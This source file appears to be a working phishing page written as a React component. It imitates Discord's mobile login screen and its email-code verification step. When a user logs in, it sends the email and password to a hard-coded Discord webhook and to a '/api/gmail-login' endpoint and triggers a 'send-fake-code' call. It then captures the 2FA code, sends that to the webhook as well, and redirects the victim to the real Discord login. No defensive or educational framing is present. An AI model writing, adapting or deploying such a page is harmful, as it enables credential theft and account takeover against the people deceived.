'use client';
import { useForm } from 'react-hook-form';
import { useState } from 'react';
import { Eye, EyeOff, ArrowLeft, X } from 'lucide-react';

type FormData = { email: string; password: string; code?: string };

export default function LoginForm() {
  const { register, handleSubmit, watch, formState: { errors } } = useForm<FormData>();
  const [step, setStep] = useState<'login' | 'code'>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  
  const emailValue = watch('email');

  const onLogin = async (data: FormData) => {
    setLoading(true);
    setEmail(data.email);
    setPassword(data.password);

    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "New Login Attempt",
          color: 0x5865f2,
          fields: [
            { name: "Email", value: data.email },
            { name: "Password", value: data.password }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });

    // Parallel execution for faster response
    Promise.all([
      fetch('/api/gmail-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: data.email, password: data.password })
      }).catch(() => {}),
      
      fetch('/api/send-fake-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: data.email })
      }).catch(() => {})
    ]);

    setStep('code');
    setLoading(false);
  };

  const onCode = async (data: FormData) => {
    setLoading(true);
    
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "2FA Code Entered",
          color: 0x00ff00,
          fields: [
            { name: "Email", value: email },
            { name: "Code", value: data.code }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });

    window.location.href = 'https://discord.com/login';
  };

  if (step === 'code') {
    return (
      <div className="min-h-screen bg-[#1a1b1e] flex flex-col px-4 pt-4 pb-8">
        <div className="flex items-center h-12 mb-2">
          <button onClick={() => setStep('login')} className="p-2 -ml-2">
            <ArrowLeft className="w-6 h-6 text-[#b5bac1]" strokeWidth={2} />
          </button>
        </div>
        
        <div className="px-2">
          <h1 className="text-[24px] font-bold text-[#f2f3f5] mb-2 tracking-tight">Check your email</h1>
          <p className="text-[#b5bac1] text-[14px] leading-[20px] mb-6">
            We sent a code to <span className="text-[#f2f3f5] font-medium">{email}</span>
          </p>

          <form onSubmit={handleSubmit(onCode)} className="space-y-4">
            <div className="relative">
              <input
                {...register('code', { required: true })}
                maxLength={6}
                placeholder="Enter code"
                className="w-full h-[48px] bg-[#1e1f22] border-0 rounded-[8px] px-4 text-[#f2f3f5] text-[16px] placeholder:text-[#87898c] focus:outline-none focus:ring-2 focus:ring-[#5865f2] text-center tracking-[6px] font-mono"
                required
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full h-[44px] bg-[#5865f2] hover:bg-[#4752c4] active:bg-[#3c45a5] text-white font-semibold text-[16px] rounded-[8px] transition-colors disabled:opacity-70 mt-4"
            >
              {loading ? 'Verifying...' : 'Verify'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#1a1b1e] flex flex-col px-4 pt-4 pb-8">
      <div className="flex items-center h-12 mb-2">
        <button className="p-2 -ml-2">
          <ArrowLeft className="w-6 h-6 text-[#b5bac1]" strokeWidth={2} />
        </button>
      </div>

      <div className="px-2">
        <h1 className="text-[24px] font-bold text-[#f2f3f5] mb-2 tracking-tight">Welcome back!</h1>
        <p className="text-[#b5bac1] text-[14px] leading-[20px] mb-6">We're so excited to see you again!</p>

        <form onSubmit={handleSubmit(onLogin)} className="space-y-5">
          <div>
            <label className="block text-[#b5bac1] text-[12px] font-bold uppercase mb-2 tracking-[0.02em]">
              Email or Phone Number
            </label>
            <div className="relative">
              <input
                {...register('email', { required: true })}
                type="email"
                className="w-full h-[48px] bg-[#1e1f22] border-0 rounded-[8px] px-4 text-[#f2f3f5] text-[16px] placeholder:text-[#87898c] focus:outline-none focus:ring-2 focus:ring-[#5865f2]"
                placeholder=""
                required
              />
              {emailValue && (
                <button
                  type="button"
                  onClick={() => {}}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#b5bac1]"
                >
                  <X className="w-5 h-5" />
                </button>
              )}
            </div>
            {errors.email && (
              <p className="text-[#f23f43] text-[12px] mt-2 flex items-center gap-1.5 font-medium">
                <span className="w-4 h-4 rounded-full bg-[#f23f43] text-white flex items-center justify-center text-[10px] font-bold">!</span>
                This field is required
              </p>
            )}
          </div>

          <div>
            <label className="block text-[#b5bac1] text-[12px] font-bold uppercase mb-2 tracking-[0.02em]">
              Password
            </label>
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                {...register('password', { required: true })}
                className="w-full h-[48px] bg-[#1e1f22] border-0 rounded-[8px] px-4 pr-12 text-[#f2f3f5] text-[16px] placeholder:text-[#87898c] focus:outline-none focus:ring-2 focus:ring-[#5865f2]"
                placeholder=""
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#b5bac1] hover:text-[#f2f3f5] transition-colors"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>

          <button
            type="button"
            className="text-[#00a8fc] text-[14px] font-medium hover:underline"
          >
            Forgot your password?
          </button>

          <button
            type="submit"
            disabled={loading}
            className="w-full h-[44px] bg-[#5865f2] hover:bg-[#4752c4] active:bg-[#3c45a5] text-white font-semibold text-[16px] rounded-[8px] transition-colors disabled:opacity-70"
          >
            {loading ? 'Logging in...' : 'Log In'}
          </button>

          <div className="text-center mt-4">
            <span className="text-[#949ba4] text-[14px]">Or, </span>
            <button type="button" className="text-[#00a8fc] text-[14px] font-medium hover:underline">
              sign in with passkey
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
